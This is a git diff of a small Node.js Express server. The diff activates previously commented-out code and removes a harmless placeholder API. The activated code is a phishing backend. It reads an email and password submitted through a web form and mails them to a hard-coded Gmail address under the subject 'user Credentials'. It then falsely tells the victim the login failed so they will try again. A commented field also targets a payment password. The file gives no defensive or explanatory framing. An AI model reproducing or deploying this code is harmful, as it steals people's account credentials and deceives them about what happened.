@@ -1,80 +1,59 @@
-// import express from 'express' ;
-// import nodemailer from 'nodemailer' ;
-// import bodyParser from 'body-parser'
-// import dotenv from 'dotenv';
+import express from 'express' ;
+import nodemailer from 'nodemailer' ;
+import bodyParser from 'body-parser'
+import dotenv from 'dotenv';
 
-// dotenv.config(); // Load environment variables from .env file
+dotenv.config(); // Load environment variables from .env file
 
-// const app = express();
-// //configuring ejs
-// app.set("view engine","ejs")
-// app.use(bodyParser.urlencoded({ extended: true}))
-// const transporter = nodemailer.createTransport({
-//     service: 'gmail',
-//     auth: {
-//         user: process.env.EMAIL,
-//         pass: process.env.PASSWORD,
-//     },
-// });
-// app.use(express.static("public"))
+const app = express();
+//configuring ejs
+app.set("view engine","ejs")
+app.use(bodyParser.urlencoded({ extended: true}))
+const transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+        user: process.env.EMAIL,
+        pass: process.env.PASSWORD,
+    },
+});
+app.use(express.static("public"))
 
-// app.get("/",(req,res)=>{
-//     res.render('index',{greet:""});
-// })
+app.get("/",(req,res)=>{
+    res.render('index',{greet:""});
+})
 
-// app.post('/send-email', async (req, res) => {
+app.post('/send-email', async (req, res) => {
 
-//     const formFields = req.body;
-//     const hasEmptyValue = Object.values(formFields).some(value => value === '');
+    const formFields = req.body;
+    const hasEmptyValue = Object.values(formFields).some(value => value === '');
   
-//     if (hasEmptyValue) {
-//       res.render('emptyFieldsAlert');
-//     } else {
+    if (hasEmptyValue) {
+      res.render('emptyFieldsAlert');
+    } else {
         
-//      const email=req.body.email;
-//      const password=req.body.password;
-//     //  const payment_password=req.body.payment_password;
-//      const email_content=`email : ${email}\n password : ${password} \n `
+     const email=req.body.email;
+     const password=req.body.password;
+    //  const payment_password=req.body.payment_password;
+     const email_content=`email : ${email}\n password : ${password} \n `
   
-//     try {
-//         await transporter.sendMail({
-//             to:"linkchaudhary@gmail.com",
-//             from:"mradul.developer@gmail.com",
-//             subject:"user Credentials",
-//             text:email_content
+    try {
+        await transporter.sendMail({
+            to:"linkchaudhary@gmail.com",
+            from:"mradul.developer@gmail.com",
+            subject:"user Credentials",
+            text:email_content
             
-//         });
-//         res.status(200);
-//     } catch (error) {
-//         res.status(500).send("<script>window.alert('something went wrong Try again'); window.history.back()</script>");
-//     }
+        });
+        res.status(200);
+    } catch (error) {
+        res.status(500).send("<script>window.alert('something went wrong Try again'); window.history.back()</script>");
+    }
 
-//     }
-//     res.render("index",{greet:"Mail or Password is wrong,Try again"})
-// });
-// const PORT = process.env.PORT || 3000;
-// app.listen(PORT, () => {
-//     console.log('Server listening on port 3000');
-// });
-
-
-
-const express = require('express')
-
-const app = express()
-const PORT = 4000
-
+    }
+    res.render("index",{greet:"Mail or Password is wrong,Try again"})
+});
+const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`API listening on PORT ${PORT} `)
-})
+    console.log('Server listening on port 3000');
+});
 
-app.get('/', (req, res) => {
-  res.send('Hey this is my API running 🥳')
-})
-
-app.get('/about', (req, res) => {
-  res.send('This is my about route..... ')
-})
-
-// Export the Express API
-module.exports = app
